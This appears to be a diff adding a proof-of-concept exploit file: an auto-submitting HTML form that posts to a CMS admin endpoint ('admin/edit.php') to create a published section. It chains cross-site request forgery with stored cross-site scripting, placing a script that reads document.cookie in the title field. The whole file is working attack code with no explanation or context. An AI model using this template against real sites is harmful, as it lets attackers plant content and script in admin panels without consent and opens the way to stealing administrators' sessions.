@@ -1,0 +1,36 @@
+&lt;form action=&quot;http://www.example.com/admin/edit.php&quot; name=&quot;editForm&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;tab&quot; value=&quot;object&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;op&quot; value=&quot;new&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;op2&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;refresh&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;tyyp_id&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;tyyp&quot; value=&quot;rubriik&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;pearubriik&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;27746&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;parent_id&quot; value=&quot;27270&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;previous_id&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;keel&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;on_pealkiri&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;sorting&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;extension_path&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;opener_location&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;publish&quot; value=&quot;1&quot; /&gt;
+&lt;input name=&quot;permanent_parent_id&quot; type=&quot;hidden&quot; value=&quot;27270&quot; /&gt;
+&lt;input name=&quot;sys_alias&quot; type=&quot;hidden&quot; value=&quot;&quot; /&gt;
+&lt;input name=&quot;advanced_panel_state&quot; type=&quot;hidden&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;pealkiri&quot; value='&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;friendly_url&quot; value=&quot;scriptalertdocumentcookiescript&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;ttyyp_id&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;publish&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;rubriik[]&quot; value=&quot;27270&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;page_ttyyp_id&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;on_meilinglist&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;avaldamise_algus&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;avaldamise_lopp&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;kesk&quot; value=&quot;0&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.editForm.submit();
+&lt;/script&gt;
+
+
